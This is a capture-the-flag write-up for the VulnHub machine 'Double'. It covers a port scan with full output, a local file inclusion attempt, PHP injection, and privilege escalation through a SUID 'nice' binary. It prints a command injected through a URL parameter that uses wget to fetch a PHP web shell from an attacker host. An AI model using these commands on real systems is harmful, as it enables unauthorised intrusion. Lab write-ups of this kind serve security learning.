# VulnHub-Double

## Netdiscover

<img src="https://imgur.com/u8vD72S.png"/>

## Rustscan

```
 rustscan -a 192.168.1.9 -- -A -sC -sV                                                  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.             
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |             
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |     
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'                                                                                            
The Modern Day Port Scanner.                                                                                                                        
________________________________________                                                                                                            
: https://discord.gg/GFrQsGy           :                                                                                                            
: https://github.com/RustScan/RustScan :                                                                                                            
 --------------------------------------                                                                                                             
Real hackers hack time ⌛                                                       
[~] The config file is expected to be at "/root/.rustscan.toml"                                                                                     
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers                                 
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.          
Open 192.168.1.9:22                                      
Open 192.168.1.9:25                                                 
Open 192.168.1.9:80                                                 
Open 192.168.1.9:8080 



PORT     STATE SERVICE REASON         VERSION                             
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:       
|   2048 de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bVoBm6Jd8SD9AJ0qjLyo0oU4cgQthlFxui+n/qXM6NYRxBcWn0gva/MDLyW1neLva6hhuKFR/6GE6PtQ1Gge9SKOzmQPGXi2RBUQaVINZu
Ydb6Q0QR0BT3ppGMMsw8bNxluttaYIzbeK5tR4zCG8xPGss6LvLbtjfcjugxKWRF58hstDIHwtPhzYX3gnH17yN5w6NuSlpPwaCTbcFZNAqqAhoKSBBIUcZTYC5mdcp+EOR6ao3LCsk98bOxNSKz
3RdfmN3ch1Z6NaEbR/A9DIEoeC5e+e1GG6zGoDoSET1QstiMAahrs2yIhfHVxQUhlS9upju8OrRB0yCWvE2IG3
|   256 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJPWpmfjbTeUtsjjJTkCPHFjiq+48Q/3ZYU+H0Kc/K6S785qBs1oRncFAGFV9A0xYtaUnmnohu
0OHP7sRJVoUR8=                       
|   256 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJElctLWgcGu5SJqqW0MvhE4rBIGL0YLBZYt4sg+esy/
25/tcp   open  smtp    syn-ack ttl 64 Postfix smtpd
|_smtp-commands: shredder.calipendu.la, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
| ssl-cert: Subject: commonName=shredder.calipendu.la
| Subject Alternative Name: DNS:shredder.calipendu.la
| Issuer: commonName=shredder.calipendu.la
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
| http-methods:        
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8080/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38
| http-auth:                                                              
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=HU?                                                       
|_http-server-header: Apache/2.4.38 (Debian)                      
|_http-title: 401 Unauthorized                                            
MAC Address: 08:00:27:6A:6B:F6 (Oracle VirtualBox virtual NIC)    


```


## PORT 80 (HTTP)

<img src="https://imgur.com/bUJsDWI.png"/>

On clicking `Test` it will redirect us to port 8080 by asking credentials

<img src="https://imgur.com/bpSLkzX.png"/>

<img src="https://imgur.com/zYPRhfy.png"/>

We can see a paramter `out`
<img src="https://imgur.com/nJqHi0j.png"/>

On tampering with that paramter it gave an error which is useful to us because error is related to opening a file `include_path` so we can try for lfi (Local File Inclusion)

<img src="https://imgur.com/DR7Sdru.png"/>

But apart from just seeing `/etc/passwd` can't access anything else. Going back to `/production` I tried to inject php code

<img src="https://imgur.com/qeNMXQN.png"/>

<img src="https://imgur.com/Wjd9ln9.png"/>

Now I can get a reverse shell but running `netcat` directly through parameter was not working I was getting a connection then it was closing so I upload `phpbash.php` which is an interactive php shell

`http://192.168.1.9/production/sendcommand.php?out=out&cmd=wget http://attacker_ip/phpbash.php;`

<img src="https://imgur.com/0gLaOI8.png"/>

After getting a netcat shell I ran linpeas

<img src="https://imgur.com/opKtkU9.png"/>

it showed `nice` as SUID , nice is a binary used to invoke a utility or shell script with a particular CPU priority, thus giving the process more or less CPU time than other processes as it is a system binary there might be something on GTFOBINS for it

<img src="https://imgur.com/F0FxyJI.png"/>

<img src="https://imgur.com/oBkuq5M.png"/>
